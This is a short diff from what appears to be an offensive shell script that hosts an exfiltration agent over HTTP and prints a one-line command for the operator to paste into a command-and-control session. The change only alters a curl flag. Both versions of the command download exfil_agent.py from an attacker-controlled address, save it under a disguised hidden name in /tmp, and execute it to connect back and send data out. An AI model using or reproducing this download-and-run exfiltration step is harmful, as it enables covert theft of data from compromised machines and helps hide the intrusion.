@@ -31,7 +31,7 @@ echo "[+] HTTP server running (PID: ${HTTP_PID})"
 echo ""
 echo "[*] Paste this ONE command into C2:"
 echo ""
-echo "curl -s http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
+echo "curl -sS http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
 echo ""
 echo "[*] Press Enter after agent connects to stop HTTP server..."
 read -r
